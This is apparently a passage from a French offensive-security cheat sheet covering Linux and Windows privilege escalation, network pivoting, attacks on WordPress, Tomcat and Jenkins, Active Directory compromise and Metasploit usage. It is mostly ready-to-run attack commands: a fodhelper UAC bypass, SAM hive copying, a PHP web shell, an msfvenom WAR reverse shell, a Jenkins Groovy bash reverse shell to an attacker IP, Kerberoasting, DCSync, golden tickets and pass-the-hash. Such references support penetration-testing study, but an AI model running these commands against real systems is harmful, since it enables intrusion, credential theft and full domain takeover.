```

| Vecteur | Verification | Exploitation |
|---|---|---|
| **sudo** | `sudo -l` | GTFOBins pour le binaire autorise |
| **SUID** | `find / -perm -4000` | GTFOBins pour le binaire SUID |
| **Capabilities** | `getcap -r /` | `cap_setuid` sur python/perl = root |
| **Cron** | `cat /etc/crontab` | Modifier le script execute par root |
| **PATH hijacking** | Cron/SUID sans chemin absolu | Creer un binaire du meme nom dans PATH |
| **Wildcard injection** | Cron avec `*` dans tar/rsync | Fichiers nommes comme des flags |
| **Kernel** | `uname -r` | Exploit kernel (DirtyPipe, etc.) |
| **Docker/LXD** | `id` (groupe docker/lxd) | Monter le filesystem hote |
| **Writable /etc/passwd** | `ls -la /etc/passwd` | Ajouter un utilisateur root |
| **LD_PRELOAD (sudo)** | `sudo -l` (env_keep+=LD_PRELOAD) | Charger une .so malveillante |
| **NFS no_root_squash** | `cat /etc/exports` | Monter depuis l'attaquant en root |
| **Shared library** | `ldd /binaire_suid` | Creer une .so hijackee dans le path |

### Windows

```powershell
# - Enumeration rapide
whoami /all
net user
net localgroup Administrators
systeminfo
cmdkey /list                          # Credentials sauvegardes
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # Autologon

# - Services et binaires
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
accesschk.exe -uwcv * 2>nul           # Services avec permissions faibles
sc qc <nom_service>                   # Detail d'un service

# - DLL hijacking
# Identifier les DLL manquantes avec Procmon/Process Monitor
# Verifier les chemins inscriptibles dans %PATH%
$env:PATH -split ";" | ForEach-Object { icacls $_ }

# - UAC bypass (fodhelper, Medium -> High)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(default)" "cmd /c start C:\Temp\shell.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" ""
Start-Process "C:\Windows\System32\fodhelper.exe"

# - HiveNightmare / SeriousSam (CVE-2021-36934)
icacls C:\Windows\System32\config\sam   # verifier si Users a acces
copy C:\Windows\System32\config\sam C:\Temp\sam
copy C:\Windows\System32\config\system C:\Temp\system
# Sur votre machine : secretsdump.py LOCAL -sam sam -system system

# - Outils automatises
.\winPEASx64.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

| Vecteur | Verification | Exploitation |
|---|---|---|
| **SeImpersonate** | `whoami /priv` | PrintSpoofer, GodPotato, JuicyPotato |
| **SeBackup** | `whoami /priv` | Copier SAM/SYSTEM, extraire les hashes |
| **SeTakeOwnership** | `whoami /priv` | Prendre possession de fichiers sensibles |
| **AlwaysInstallElevated** | `reg query HKLM\...\Installer` | MSI malveillant execute en SYSTEM |
| **Unquoted service path** | `wmic service get name,pathname` | DLL/exe dans le chemin non quote |
| **Service writable** | `accesschk.exe -uwcv *` | Modifier le binPath du service |
| **Autologon** | Registry Winlogon | Credentials en clair |
| **SAM/SYSTEM** | Copier depuis `C:\Windows\System32\config\` | `secretsdump.py LOCAL -sam SAM -system SYSTEM` |
| **UAC bypass** | `whoami /groups` (Medium Mandatory Level) | fodhelper.exe, eventvwr.exe |
| **DLL hijacking** | Services avec chemin DLL inscriptible | Creer la DLL manquante dans le chemin |
| **HiveNightmare** | `icacls C:\Windows\System32\config\sam` | Lire SAM/SYSTEM sans admin (CVE-2021-36934) |

---

## Pivoting

### SSH

```bash
# - Dynamic port forwarding (proxy SOCKS)
ssh -D 8081 -N -f utilisateur@<IP_PIVOT>
# Configurer /etc/proxychains.conf : socks4 127.0.0.1 8081
proxychains nmap -sT -p 80,445,3389 <RESEAU_INTERNE>

# - Local port forwarding
ssh -L <PORT_LOCAL>:<IP_INTERNE>:<PORT_DISTANT> utilisateur@<IP_PIVOT>
# Exemple : acceder au RDP d'un hote interne
ssh -L 13389:172.16.8.20:3389 utilisateur@<IP_PIVOT>

# - Remote port forwarding
ssh -R <PORT_DISTANT>:127.0.0.1:<PORT_LOCAL> utilisateur@<IP_PIVOT>

# - Stabiliser le tunnel
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 8081 utilisateur@<IP_PIVOT>
```

### Chisel

```bash
# - Serveur (machine d'attaque)
./chisel server -p 8888 --reverse

# - Client SOCKS (hote compromis)
./chisel client <IP_ATTAQUANT>:8888 R:socks

# - Client port forward
./chisel client <IP_ATTAQUANT>:8888 R:8080:172.16.8.20:80
```

### Ligolo-ng

```bash
# - Proxy (machine d'attaque)
./proxy -selfcert -laddr 0.0.0.0:11601

# - Agent (hote compromis)
./agent -connect <IP_ATTAQUANT>:11601 -ignore-cert

# - Sur le proxy
>> session
>> start
sudo ip route add 172.16.8.0/24 dev ligolo
```

### Sshuttle

```bash
# - Tunneliser tout le trafic vers un sous-reseau via SSH
sshuttle -r utilisateur@<IP_PIVOT> 172.16.8.0/24

# - Avec cle privee
sshuttle -r utilisateur@<IP_PIVOT> --ssh-cmd "ssh -i cle.pem" 172.16.8.0/24

# - Exclure la machine pivot
sshuttle -r utilisateur@<IP_PIVOT> 172.16.0.0/16 -e <IP_PIVOT>
```

### Rpivot

```bash
# - Serveur (machine d'attaque)
python3 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# - Client (hote compromis)
python3 client.py --server-ip <IP_ATTAQUANT> --server-port 9999

# - Configurer proxychains (socks4 127.0.0.1 9050)
proxychains nmap -sT -p 80,443 <IP_INTERNE>
```

### Pivoting Windows (Plink / Netsh)

```cmd
:: - Plink.exe (SSH client Windows) - reverse SOCKS
plink.exe -D 8181 -fw utilisateur@<IP_ATTAQUANT>

:: - Netsh port forwarding (sans outil externe)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.8.10
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Meterpreter pivot

```bash
# - Apres avoir un shell Meterpreter sur la machine pivot :
run autoroute -s 172.16.8.0/24      # ajouter la route
run autoroute -p                    # verifier les routes

# - SOCKS proxy via Meterpreter
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
# proxychains.conf : socks5 127.0.0.1 1080

# - Port forwarding Meterpreter
portfwd add -l 13389 -p 3389 -r 172.16.8.20
# Connexion : xfreerdp /v:127.0.0.1:13389 /u:utilisateur /p:motdepasse
```

---

## Applications communes

### WordPress

```bash
# - Enumeration
wpscan --url http://<IP_CIBLE> --enumerate u,p,t,cb,dbe
wpscan --url http://<IP_CIBLE> -U admin -P /usr/share/wordlists/rockyou.txt

# - RCE via Theme Editor (acces admin requis)
# Appearance -> Theme Editor -> choisir un theme non actif -> 404.php
# Inserer : <?php system($_GET["cmd"]); ?>
# Appeler : http://<IP_CIBLE>/wp-content/themes/<theme>/404.php?cmd=id

# - RCE via Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <IP_CIBLE>
set USERNAME admin
set PASSWORD motdepasse
set TARGETURI /
exploit

# - Credential harvesting depuis wp-config.php
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD"
```

### Tomcat

```bash
# - Enumeration
nmap --script=http-tomcat-manager -p 8080 <IP_CIBLE>
gobuster dir -u http://<IP_CIBLE>:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# - Brute force Tomcat Manager
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 8080 http-get://<IP_CIBLE>/manager/html
# Identifiants par defaut : tomcat:tomcat, admin:admin, tomcat:s3cret

# - RCE via upload WAR (Manager requis)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f war -o shell.war
curl -u tomcat:s3cret http://<IP_CIBLE>:8080/manager/text/deploy?path=/shell -T shell.war
curl http://<IP_CIBLE>:8080/shell/   # declencher le shell
```

### Jenkins

```bash
# - Enumeration
nmap -sV -p 8080 <IP_CIBLE>
# Verifier /login, /api, /script (Script Console)

# - RCE via Script Console (Groovy) - acces admin requis
# Naviguer vers /script :
cmd = "id"
println cmd.execute().text

# Reverse shell via Script Console :
String host = "<IP_ATTAQUANT>";
int port = 4444;
String cmd2 = "bash -i >& /dev/tcp/${host}/${port} 0>&1";
["bash", "-c", cmd2].execute();

# - RCE via Metasploit
use exploit/multi/http/jenkins_script_console
set RHOSTS <IP_CIBLE>
set RPORT 8080
exploit
```

### Joomla / Drupal

```bash
# - Joomla
joomscan -u http://<IP_CIBLE>
# RCE : Extensions -> Templates -> Choisir template -> modifier un .php
# Credentials par defaut admin:admin dans /administrator

# - Drupal
droopescan scan drupal -u http://<IP_CIBLE>
# RCE : Modules -> PHP filter (si disponible) -> activer + creer un article avec du PHP
# CVE-2018-7600 (Drupalgeddon2) :
python3 drupalgeddon2.py http://<IP_CIBLE>
```

---

## Active Directory

### Enumeration

```bash
# - BloodHound (collecte)
.\SharpHound.exe -c All
proxychains bloodhound-python -u utilisateur -p motdepasse -d DOMAINE.LOCAL -ns <IP_DC> -c All

# - PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname,description
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Find-DomainShare -CheckShareAccess
Get-DomainGPO | select displayname,gpcfilesyspath
Get-ObjectAcl -Identity "utilisateur" -ResolveGUIDs

# - ldapsearch
ldapsearch -x -H ldap://<IP_DC> -D "DOMAINE\\utilisateur" -w motdepasse -b "DC=DOMAINE,DC=LOCAL"
```

### Attaques courantes

{% tabs %}
{% tab title="Kerberoasting" %}
```bash
# - Enumerer les comptes avec SPN
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC>

# - Extraire le ticket TGS
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC> -request

# - Craquer
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="AS-REP Roasting" %}
```bash
# - Sans credentials
proxychains GetNPUsers.py DOMAINE/ -usersfile users.txt -dc-ip <IP_DC> -no-pass

# - Avec credentials
proxychains GetNPUsers.py DOMAINE/utilisateur -dc-ip <IP_DC>

# - Craquer
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="LLMNR Poisoning" %}
```bash
# - Responder
sudo responder -I eth0 -dwPv

# - Craquer les hashes NetNTLMv2 captures
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="Password Spraying" %}
```bash
# - CrackMapExec
crackmapexec smb <IP_DC> -u users.txt -p 'MotDePasse2024!' --continue-on-success

# - Kerbrute
kerbrute passwordspray -d DOMAINE.LOCAL --dc <IP_DC> users.txt 'MotDePasse2024!'
```
{% endtab %}
{% endtabs %}

### Mouvement lateral

```bash
# - Pass-the-Hash
crackmapexec smb <IP_CIBLE> -u administrateur -H <HASH_NTLM>
psexec.py DOMAINE/administrateur@<IP_CIBLE> -hashes :<HASH_NTLM>
evil-winrm -i <IP_CIBLE> -u administrateur -H <HASH_NTLM>

# - Abus ACL : ForceChangePassword
$pass = ConvertTo-SecureString 'NouveauMdP!' -AsPlainText -Force
Set-DomainUserPassword -Identity cible -AccountPassword $pass

# - Abus ACL : GenericWrite (faux SPN pour Kerberoasting cible)
Set-DomainObject -Identity cible -SET @{serviceprincipalname='faux/SPN'}

# - Extraction de secrets
secretsdump.py DOMAINE/utilisateur@<IP_CIBLE>
crackmapexec smb <IP_CIBLE> -u admin -p motdepasse --sam
crackmapexec smb <IP_CIBLE> -u admin -p motdepasse --lsa
```

### Compromission du domaine

```bash
# - DCSync
secretsdump.py DOMAINE/utilisateur_da@<IP_DC>

# - Golden Ticket
ticketer.py -nthash <HASH_KRBTGT> -domain-sid <SID> -domain DOMAINE.LOCAL administrateur

# - Pass-the-Ticket
export KRB5CCNAME=administrateur.ccache
psexec.py -k -no-pass DOMAINE.LOCAL/administrateur@dc01.domaine.local
```

---

## Metasploit

```bash
# - Recherche
search type:exploit platform:windows smb
search cve:2021-34527

# - Utilisation d'un module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_CIBLE>
set LHOST <IP_ATTAQUANT>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# - Meterpreter
getuid
sysinfo
hashdump
getsystem
upload /tmp/outil.exe C:\\Temp\\outil.exe
download C:\\Users\\admin\\flag.txt
shell
bg                    # Mettre la session en arriere-plan
sessions -l           # Lister les sessions
sessions -i 1         # Reprendre la session 1

# - Pivoting Meterpreter
run autoroute -s 172.16.8.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

---

## Outils Impacket (reference rapide)

| Outil | Usage |
|---|---|
| `psexec.py` | Shell SYSTEM via SMB (depots de service) |
| `wmiexec.py` | Shell semi-interactif via WMI |
| `smbexec.py` | Shell via SMB sans ecrire de binaire |
| `atexec.py` | Execution via taches planifiees |
| `evil-winrm` | Shell via WinRM (pas Impacket mais complementaire) |
| `secretsdump.py` | Extraction SAM/LSA/NTDS/DCSync |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |
| `ticketer.py` | Forge de tickets Kerberos |
| `lookupsid.py` | Enumeration SID/RID |
| `mssqlclient.py` | Client MSSQL interactif |

---

## Wordlists utiles

| Wordlist | Chemin | Usage |
|---|---|---|
| **rockyou.txt** | `/usr/share/wordlists/rockyou.txt` | Cassage de mots de passe |
| **directory-list-2.3-medium** | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Fuzzing web |
| **subdomains-top1million-5000** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | Enumeration DNS |
| **common-snmp-community** | `/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt` | SNMP |
| **burp-parameter-names** | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` | Fuzzing de parametres |
| **raft-medium-words** | `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt` | Fuzzing web (alternatif) |
| **xato-net-10-million** | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt` | Mots de passe (alternatif) |

---

## Ressources rapides

| Ressource | URL |
|---|---|
| **GTFOBins** | gtfobins.github.io |
| **LOLBAS** | lolbas-project.github.io |
| **RevShells** | revshells.com |
| **CyberChef** | gchq.github.io/CyberChef |
| **PayloadsAllTheThings** | github.com/swisskyrepo/PayloadsAllTheThings |
| **HackTricks** | book.hacktricks.wiki |
| **Wadcoms** | wadcoms.github.io |

***
